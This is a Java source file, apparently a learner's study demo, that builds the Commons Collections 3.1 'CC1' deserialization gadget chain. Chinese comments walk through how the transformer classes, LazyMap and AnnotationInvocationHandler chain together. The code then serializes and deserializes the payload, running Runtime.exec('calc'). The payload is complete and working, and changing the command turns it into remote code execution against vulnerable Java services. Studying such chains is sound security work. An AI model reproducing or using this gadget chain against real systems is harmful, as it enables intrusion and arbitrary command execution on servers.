package com.soytn1ce.serdemo.cc;

import com.soytn1ce.serdemo.utils.SerialUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.HashedMap;
import org.apache.commons.collections.map.LazyMap;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;


/**
 * cc1:cc-3.1
 *
 * 基于接口Transformer的多态，关键类ChainedTransformer、Transformer、InvokerTransformer、ConstantTransform
 *
 * tips:!!!interface:Transformer  实现transform方法
 *
 * ConstantTransformer的transform如下：即通过ConstantTransformer可以获得一个构造函数传参的类
 * public Object transform(Object input) {
 *         return this.iConstant;
 *     }
 * public ConstantTransformer(Object constantToReturn) {
 *         this.iConstant = constantToReturn;
 *     }
 *
 * ChainedTransformer的transform如下：
 * 即最后返回的Object是基于上一个得到的object，可以不停传递
 *     public Object transform(Object object) {
 *         for(int i = 0; i < this.iTransformers.length; ++i) {
 *             object = this.iTransformers[i].transform(object);
 *         }
 *
 *         return object;
 *
 * object放到iTransformers里，即Transformer[]，这里要放需要利用实现的类对象
 * public ChainedTransformer(Transformer[] transformers) {
 *         this.iTransformers = transformers;
 *     }
 *
 *
 *  InvokerTransformer如下，其transform会利用反射调用传入的Object的方法
 *  public Object transform(Object input) {
 *         if (input == null) {
 *             return null;
 *         } else {
 *             try {
 *                 Class cls = input.getClass();
 *                 Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
 *                 return method.invoke(input, this.iArgs);
 *  public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
 *         this.iMethodName = methodName;
 *         this.iParamTypes = paramTypes;
 *         this.iArgs = args;
 *     }
 *
 * 应该有两个链，T T实在看的脑壳痛了
 * 最后思路如下，以执行Runtime.getRuntime.exec('calc')为例子：
 * 1、需要创建一个InvokerTransformer，第一个参数是exec，第二哥参数是String.class，第三个参数是calc
 * 2、调用InvokerTransformer.transform，传入参数需要是Runtime实例
 * 3、通过ConstantTransformer拿到Runtime.class，通过InvokerTransformer传入Runtime.class调用getRuntime拿到Runtime实例
 * 4、利用ChainedTransformer的transformer，将链子放到里面执行InvokerTransformer的transform
 * 5、通过lazyMap触发transformer
 * 6、AnnotationInvocationHandler的readObject方法触发LazyMap.get
 * 7、触发map.entryset
 */
public class CC1 {
    public static void main(String[] args) throws Exception{
        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);
        //搭Transformer
        Transformer[] transformers = new Transformer[]{
                constantTransformer,
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class}, new Object[]{null,new Class[0]}),
                new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc"})
        };
        //通过反射设置iTransformers是链子
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(constantTransformer);

        //lazymap.decorate设置factory，会在 .put方法使用factory
        Map innermap = new HashedMap();
        //触发setValue
        innermap.put("value","1");
        Map lazyMap =  LazyMap.decorate(innermap,chainedTransformer);

        //通过反射和代理机制
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);

        SerialUtil serialUtil = new SerialUtil();
        byte[] serData = serialUtil.serialize(handler);
        serialUtil.unserialize(serData);
    }
}
